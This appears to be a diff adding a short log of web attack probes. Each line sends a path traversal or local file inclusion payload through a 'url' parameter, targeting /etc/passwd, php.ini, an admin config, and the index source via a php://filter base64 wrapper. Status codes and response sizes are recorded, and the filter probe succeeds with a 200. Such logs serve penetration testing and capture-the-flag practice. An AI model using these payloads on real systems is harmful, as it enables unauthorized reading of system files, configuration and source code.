@@ -1,0 +1,10 @@
+?url=../../../../etc/passwd                              [403 31013B] Access Denied
+
+?url=../../../../../../etc/passwd                        [403 31013B] Access Denied
+
+?url=php://filter/convert.base64-encode/resource=index   [200 14636B] 
+?url=../../../../php.ini                                 [403 31013B] Access Denied
+
+?url=../../../admin/config                               [403 31013B] Access Denied
+
+?url=auth/login                                          [302 0B] 
